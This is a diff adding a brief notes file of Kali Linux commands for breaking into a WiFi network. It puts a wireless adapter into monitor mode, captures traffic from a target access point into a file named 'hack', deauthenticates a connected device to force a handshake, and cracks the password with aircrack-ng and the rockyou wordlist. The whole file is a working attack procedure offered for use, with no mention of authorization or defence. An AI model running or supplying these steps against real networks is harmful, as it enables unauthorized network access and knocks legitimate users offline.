@@ -1,0 +1,17 @@
+Commands:
+sudo su
+cd /home/kali/Desktop/
+iwconfig
+airmon-ng check kill
+airmon-ng start wlan0
+iwconfig
+airodump-ng wlan0
+airodump-ng --bssid "mac of wifi" --channel 9 --write hack wlan0
+
+Open New Terminal:
+aireplay-ng --deauth 25 -a "mac of wifi" -e "mac of connected device" wlan0
+cd /home/kali/Desktop/
+
+if rockyou.txt file is in zipped format:
+gzip -d rockyou.txt.gz
+aircrack-ng hack-01.cap -w /usr/share/wordlists/rockyou.txt
